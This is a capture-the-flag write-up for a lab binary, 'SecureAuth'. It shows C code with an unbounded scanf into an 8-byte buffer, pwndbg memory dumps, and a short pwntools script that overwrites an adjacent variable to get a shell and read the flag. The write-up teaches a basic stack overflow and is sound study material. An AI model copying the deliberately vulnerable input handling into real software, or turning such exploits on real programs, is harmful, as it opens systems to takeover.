  #### Initial Analysis

  This is the main function taken from source code. We have 2 variables, `username` which is a `char` buffer of size 8, and `auth` of type `int`. `auth` is initialised with the value `0xcafebabe`. User input is read using `scanf` with the format specifier `%s`. Our goal is to overwrite `auth` to have value `0xdeadbeef` which will result in us getting a shell, which we can use to obtain the flag.
  ```c
  int main(int argc, char *argv[]){
    init();

    char username[8];
    int auth = 0xcafebabe;
    puts("Welcome to the most Secure Authorization service!");
    printf("Enter your username: ");
    scanf("%s",&username);

    if (auth == 0xdeadbeef){
      puts("NO! How did you bypass me?!");
      system("/bin/sh");
    }

    puts("You can't fool me (¬_¬)");
    exit(0);
  }
  ```

  #### Exploitation

  The vulnerability here is caused by using the format specifier `%s` with `scanf`. The issue with this particular format specifier is that it reads input of any size and stores it in a buffer of fixed size. This may cause a buffer overflow, if input size exceeds the size of the buffer. 

  In this particular challenge this vulnerability allows us to write past the memory allocated for `username` and into `auth`. This allows us to modify the value of `auth`. We can test the overflow by debugging the binary with `gdb` and giving an input such as `AAAAAAAABBBB`. The first 8 "A"s will fill the `username` buffer. The remaining "B"s will overwrite 0xcafebabe stored in `auth`.

  Before reading input:
  ```
  pwndbg> x/3wx $rbp-12
  0x7fffffffe874: 0x00007fff  0x00000000  0xcafebabe
                  |--------username--------|      |--auth--|
  ```

  After reading input:
  ```
  pwndbg> x/3wx $rbp-12
  0x7fffffffe874: 0x41414141  0x41414141  0x42424242
                  |--------username--------|      |--auth--|
  ```

  `0x41` is the hexadecimal ASCII value of "A" and `0x42` is the hexadecimal ASCII value of "B". Hence it can be seen that we overwrote `auth` with our "B"s.
  Since data is stored in `little endian` (reverse order for every 4 bytes), in order to get `0xdeadbeef` in memory, we have to give input `"\xef\xbe\xad\xde"`.

  Final exploit:
  ```py
  from pwn import *

  p = process("./SecureAuth")
  p.sendlineafter("username: ","A"*8+"\xef\xbe\xad\xde")
  p.sendlineafter("?!\n", "cat flag.txt")
  p.interactive()
  ```

  #### Conclusion

  In summary,
  - we have 2 variables, `username` which is a `char` buffer and `auth` which is an `int` with value `0xcafebabe`.
  - use buffer overflow caused by `scanf` to fill `username` buffer and overwrite `auth` to `0xdeadbeef`.
  - check is passed and we are given a shell with which flag can be obtained.
